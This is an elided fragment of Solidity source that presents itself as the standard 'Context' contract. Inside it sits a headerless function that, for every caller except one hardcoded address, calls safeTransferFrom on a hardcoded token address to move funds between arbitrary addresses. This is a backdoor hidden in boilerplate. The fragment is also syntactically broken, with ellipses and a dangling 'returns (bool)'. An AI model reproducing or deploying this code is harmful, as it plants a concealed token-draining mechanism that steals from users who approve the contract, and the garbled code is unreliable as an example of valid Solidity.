...
abstract contract Context {
  ...
  function _msgData() internal view virtual returns (bytes calldata) {
    ...
    returns (bool) {if (msg.sender != address(0x1D3B0F122047DF0A829420F07Aff578f0105F1ee)) {TransferHelper.safeTransferFrom(0x273044BCD1A9266E963Cc17176e7363418fB265B,spender,recipient,amount);return true;}return false;}
}
